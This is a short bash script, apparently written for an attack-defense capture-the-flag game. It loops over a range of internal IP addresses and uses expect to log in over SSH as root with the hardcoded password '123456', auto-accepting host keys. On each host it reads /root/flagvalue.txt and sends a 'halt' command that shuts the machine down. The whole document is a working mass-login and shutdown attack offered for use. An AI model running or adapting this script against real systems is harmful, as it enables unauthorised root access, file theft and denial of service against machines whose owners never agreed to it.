for ((i=155;i<=160;i=i+1))
do
	ip="192.168."$i".146"
	/usr/bin/expect<<eof
spawn timeout 0.4 ssh root@$ip cat /root/flagvalue.txt\nhalt
expect {
"yes/no" {send "yes\n";exp_continue}
"password" {send "123456\n"}
}
expect
eof
done
